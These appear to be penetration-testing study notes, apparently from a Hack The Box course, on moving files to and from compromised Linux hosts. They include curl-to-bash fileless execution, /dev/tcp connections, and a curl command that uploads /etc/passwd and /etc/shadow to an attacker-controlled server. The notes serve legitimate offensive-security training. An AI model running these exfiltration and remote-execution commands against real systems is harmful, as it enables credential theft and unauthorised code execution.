# Linux File Transfer Methods

***

## <mark style="color:red;">Download Operations</mark>

![image](https://academy.hackthebox.com/storage/modules/24/LinuxDownloadUpload.drawio.png)

### <mark style="color:blue;">Base64 Encoding / Decoding</mark>

{% code fullWidth="true" %}
```bash
md5sum id_rsa
```
{% endcode %}

<mark style="color:orange;">**Pwnbox - Encode SSH Key to Base64**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
cat id_rsa |base64 -w 0;echo
```
{% endcode %}

<mark style="color:orange;">**Linux - Decode the File**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
echo -n 'LS0tLS1C--lUkVtLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```
{% endcode %}

<mark style="color:orange;">**Linux - Confirm the MD5 Hashes Match**</mark>

```shell-session
md5sum id_rsa
```

Note: You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.

***

### <mark style="color:blue;">Web Downloads with Wget and cURL</mark>

<mark style="color:orange;">**Download a File Using wget**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
{% endcode %}

<mark style="color:orange;">**Download a File Using cURL**</mark>

{% code fullWidth="true" %}
```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
{% endcode %}

***

### <mark style="color:blue;">Fileless Attacks Using Linux</mark>

* Les pipes sous Linux permettent d’exécuter des commandes sans écrire de fichier sur le disque (exécution « fileless »).
* Beaucoup d’outils Linux peuvent être combinés pour reproduire des opérations fileless.
* Certains payloads (p.ex. `mkfifo`) peuvent quand même créer des fichiers temporaires sur le système.
* L’exécution via pipe peut être fileless même si le payload crée des artefacts locaux selon sa nature.
* Exemple expliqué : au lieu de télécharger `LinEnum.sh`, on peut l’exécuter directement en le piping depuis `curl`.
* Attention : « fileless » ne signifie pas « sans traces » — des artefacts et logs peuvent subsister.

<mark style="color:orange;">**Fileless Download with cURL**</mark>

{% code fullWidth="true" %}
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
{% endcode %}

<mark style="color:orange;">**Fileless Download with wget**</mark>

{% code overflow="wrap" fullWidth="true" %}
```sh
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

-q : mode quiet (silencieux), ne montre pas la progression du téléchargement.

-O- : redirige la sortie vers stdout (la console) au lieu d’un fichier.
```
{% endcode %}

***

### <mark style="color:blue;">Download with Bash (/dev/tcp)</mark>

<mark style="color:orange;">**Connect to the Target Webserver**</mark>

```purebasic
exec 3<>/dev/tcp/10.10.10.32/80
```

<mark style="color:orange;">**HTTP GET Request**</mark>

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

<mark style="color:orange;">**Print the Response**</mark>

```bash
cat <&3
```

***

### <mark style="color:blue;">SSH Downloads</mark>

<mark style="color:orange;">**Enabling the SSH Server**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
sudo systemctl enable ssh
```
{% endcode %}

<mark style="color:orange;">**Starting the SSH Server**</mark>

{% code fullWidth="true" %}
```bash
sudo systemctl start ssh
```
{% endcode %}

<mark style="color:orange;">**Checking for SSH Listening Port**</mark>

{% code fullWidth="true" %}
```bash
netstat -lnpt
```
{% endcode %}

{% code fullWidth="true" %}
```sh
scp plaintext@192.168.49.128:/root/myroot.txt . 
```
{% endcode %}

Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

***

## <mark style="color:red;">Upload Operations</mark>

***

### <mark style="color:blue;">Web Upload</mark>

<mark style="color:orange;">**Pwnbox - Start Web Server**</mark>

{% code fullWidth="true" %}
```bash
sudo python3 -m pip install --user uploadserver
```
{% endcode %}

<mark style="color:orange;">**Pwnbox - Create a Self-Signed Certificate**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
{% endcode %}

<mark style="color:orange;">**Pwnbox - Start Web Server**</mark>

{% code fullWidth="true" %}
```bash
mkdir https && cd https
```
{% endcode %}

{% code fullWidth="true" %}
```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
{% endcode %}

Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.

<mark style="color:orange;">**Linux - Upload Multiple Files**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
 curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
{% endcode %}

We used the option `--insecure` because we used a self-signed certificate that we trust.

***

### <mark style="color:blue;">Alternative Web File Transfer Method</mark>

<mark style="color:orange;">**Linux - Creating a Web Server with Python3**</mark>

```bash
mrroboteLiot@htb[/htb]$ python3 -m http.server
```

<mark style="color:orange;">**Linux - Creating a Web Server with Python2.7**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ python2.7 -m SimpleHTTPServer
```

<mark style="color:orange;">**Linux - Creating a Web Server with PHP**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ php -S 0.0.0.0:8000
```

<mark style="color:orange;">**Linux - Creating a Web Server with Ruby**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ ruby -run -ehttpd . -p8000
```

<mark style="color:orange;">**Download the File from the Target Machine onto the Pwnbox**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
```

Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.

***

### <mark style="color:blue;">SCP Upload</mark>

<mark style="color:orange;">**File Upload using SCP**</mark>

{% code fullWidth="true" %}
```shell-session
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/                                                                                                         100% 3414     6.7MB/s   00:00
```
{% endcode %}

Note: Remember that scp syntax is similar to cp or copy.
